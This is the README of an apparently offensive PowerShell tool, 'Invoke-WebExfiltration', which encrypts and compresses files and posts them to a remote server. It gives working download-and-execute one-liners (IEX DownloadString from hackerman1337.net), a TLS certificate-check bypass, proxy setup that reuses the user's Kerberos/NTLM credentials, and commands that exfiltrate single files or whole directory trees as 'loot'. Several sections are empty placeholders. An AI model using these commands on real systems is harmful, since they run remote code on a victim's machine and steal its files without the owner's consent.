# Invoke-WebExfiltration
Exfiltrate data via PowerShell HTTP(s) POST request (with file gzip compression and AES-256 encryption)

Exfiltrate files to a remote server in a secure, encrypted way


# Description

# Features



# Technical details / design thoughts

- File encryption
  - File names and file content is encrypted with AES-256
  - Key size: 256 bit, block size: 128 bit, IV: 128 bit, PKCS7 padding
  - The password is SHA256 hashed to receive a 256 bit long key
  - This means that it is even safe to transfer files via plain text HTTP (assuming you use a strong password)

- Gzip compression
  - After encryption the binary data is compressed via Gzip.
  - It's quick for not too large files and reduces the size by a good few percent

- No password protection for file upload
  - The server will only accept data from POST requests which it can successfully decrypt. 
  - It tests that first on the file name.
  - If the content can't be decrypted the file name the file binary will be ignored and is discarded.
  - I kind of see that as a password protection 'light' for the file upload to prevent unwanted uploads from 3rd parties.

- Loot folder structure
  - The tool keeps the identical folder structure as it exists on the client

# ToDo:
- I'm unhappy with the way SSL/HTTPS is done. Needs improvement
- 


# Limitations
- Large files (100MB) should be split into chunks and then exfiltrated (see examples)

# Help
```bash
...
```


# Installation

## Linux
```bash
git clone https://github.com/PhilippRieth/Invoke-WebExfiltration.git
cd Invoke-WebExfiltration
pip3 install virtualenv
virtualenv -p python3 venv
source venv/bin/active
pip install -r requirements.txt
```

## Windows
```powershell
git clone https://github.com/PhilippRieth/Invoke-WebExfiltration.git
cd Invoke-WebExfiltration

pip3.exe install virtualenv
virtualenv.exe -p python3 venv
.\venv\Scripts\activate.ps1

pip install -r requirements.txt
```

# Usage & Examples

```bash


```


## Load `IWE` into PowerShell 

HTTP
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://hackerman1337.net:8000/iwe')
```

HTTPS
```powershell
# Load via WebClient and certificate validation bypass. Does not work in pwsh.exe
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX (New-Object Net.WebClient).DownloadString('https://hackerman1337.net/iwe')

# Load via Invoke-WebRequest and certificate validation bypass 
IWR 'https://hackerman1337.net/iwe' -SkipCertificateCheck | IEX
```

## Load `IWE` via proxy into PowerShell
1. Use system or custom proxy
2. Decide which proxy credentials to use (ignore if no authentication is needed)
3. Decide if x509 certificate errors should be ingored
```powershell
# 1. User system proxy
$proxy = [System.Net.WebRequest]::GetSystemWebProxy()
# 1. User custom proxy
$proxy = New-Object System.Net.WebProxy("http://yourProxy:8080")

# 2. Use current user credentials for Kerberos / NTLM authentication
$proxy.useDefaultCredentials = $true
$proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
# 2. Use custom credentials for proxy
proxy.Credentials=Get-Credential

# 3. Ignore certificate check (needed if self signed certificate is used)
# Does not work in pwsh.exe, use powershell.exe!
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$wc = new-object system.net.WebClient
$wc.proxy = $proxy
IEX $wc.DownloadString('https://hackerman1337.net:8000/iwe')
```

## Exfiltrate files

```powershell
# Exfiltrate single file
IWE -File .\file.bin

# Exfiltrate all files in current folder
ls | IWE

# Exfiltrate all files in curent dir starting with 
ls file* | IWE

# Exfiltrate all files and sub directories 
ls -Recurse * | IWE
```

## Exfiltrate large files (split into chunks)
Large files (>100MB) should be split into smaller chunks.
```powershell
tba.
```

